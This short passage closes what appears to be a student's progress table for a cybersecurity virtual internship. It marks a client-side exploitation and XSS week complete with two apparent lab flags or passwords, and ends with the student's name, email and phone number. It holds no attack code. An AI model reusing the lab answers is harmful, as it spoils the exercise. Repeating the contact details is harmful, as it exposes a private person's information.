| Week 5 | Client-Side Exploitation and XSS | ✅ Complete | `ModP@wnEd` / `AdM!nP@wnEd` |
| Week 6 | Coming soon | 🔄 Upcoming | — |

---

*MWR Cybersecurity Virtual Internship*  
*Thandolwami Christian Mashele | BCom Applied Information Systems | University of Johannesburg*  
*Contact: cmashele85@gmail.com | 068 371 4162*
